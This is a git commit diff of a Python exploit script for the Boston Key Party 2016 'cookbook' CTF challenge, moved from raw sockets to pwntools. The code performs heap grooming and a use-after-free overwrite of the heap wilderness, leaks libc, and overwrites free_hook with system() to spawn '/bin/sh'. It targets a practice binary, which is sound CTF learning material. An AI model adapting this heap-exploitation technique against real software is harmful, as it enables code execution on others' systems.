2d5387056e7d51a97b65295beabfbf22271ec6cd
Kichang Yang <kichangya@gmail.com>
2017-09-11 16:12:52 -0700

    .

--- cookbook/c.py
+++ cookbook/c.py
@@ -1,16 +1,14 @@
+# -*- coding: utf-8 -*-
 #
 # Boston Key Party 2016 pwnable cookbook
 #
-# Shamelessly copied from LiveOverflow's code
+# Shamelessly copied LiveOverflow's code
 #
 
-import struct
-import sys
-import subprocess
-import socket
-import telnetlib
 import ctypes
 import re
+
+from pwn import *
 
 # from the binary
 PRITNF_OFFSET = 0x49670
@@ -21,36 +19,25 @@ FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c
 FREE_HOOK_PTR = 0
 LIBC = 0
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#r = remote('localhost', 8888)
+r = process('./cookbook')
 
-s.settimeout(0.5)
-s.connect(('localhost', 8888))
-
-p32 = lambda x: struct.pack("I", x)
+#p32 = lambda x: struct.pack("I", x)
 
 def stou(i):
     return ctypes.c_uint32(i).value
 
 def send(msg):
-    s.send(msg + '\n')
+    r.send(msg + '\n')
 
 def recv_all():
-    b = ""
-    last_recv = True
-    while last_recv:
-        try:
-            last_recv = s.recv(1024)
-        except socket.timeout:
-            last_recv = None
-        if last_recv:
-            b += last_recv
-    return b
+    return r.recv()
 
 def fill_heap(nr):
     for i in xrange(0, nr):
         send("g")
         send(hex(0x5))
-        send(str(i))
+        send(p32(0xdeadbeef))
 
 def add_leak(addr, groom=0x200):
     if groom > 0:
@@ -71,16 +58,14 @@ def add_leak(addr, groom=0x200):
     send("e")
     send("q")
 
-    recv_all()
     send("c")
     send("g")
     OVERWRITE = "AAAABBBBCCCC" + p32(addr) + p32(0x00000000)
     send(OVERWRITE)
     send("q")
-    recv_all()
 
 def parse_ingredient():
-    recv_all()
+    r.clean()
     send("l")
     resp = recv_all()
 
@@ -103,7 +88,7 @@ if __name__ == "__main__":
     send("0")
     send("p")
     send("d")
-    recv_all()
+    r.clean()
     send("p")
     resp = recv_all()
     print resp
@@ -150,17 +135,17 @@ if __name__ == "__main__":
 
     raw_input("continue?")
 
+    # used gdb to calc the offset
+    HEAP_WILDERNESS = LEAKED_HEAP_ADDR + 0x4ddc
+    print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)
+
+    raw_input("continue?")
+
     print "use after free recipe overwriting the wilderness with 0xFFFFFFFF"
     send("c")
     send("g")
     send(p32(0x0) + p32(0x0) + p32(0xFFFFFFFF) + p32(0x0))
     send("q")
-
-    raw_input("continue?")
-
-    # used gdb to calc the offset
-    HEAP_WILDERNESS = LEAKED_HEAP_ADDR + 0x4ddc
-    print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)
 
     raw_input("continue?")
 
@@ -176,7 +161,7 @@ if __name__ == "__main__":
     print "free_hook: 0x{:08x}".format(FREE_HOOK)
     print "overwrite free_hook with system() 0x{:08x}".format(LIBC+SYSTEM_OFFSET)
     send("g")
-    send("0x9")
+    send("0x8")
     send(p32(LIBC+SYSTEM_OFFSET))
 
     raw_input("continue?")
@@ -184,10 +169,8 @@ if __name__ == "__main__":
     send("g")
     send("0x8")
     send("/bin/sh\0")
-    recv_all()
     send("R")
 
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
+    r.clean()
 
+    r.interactive()
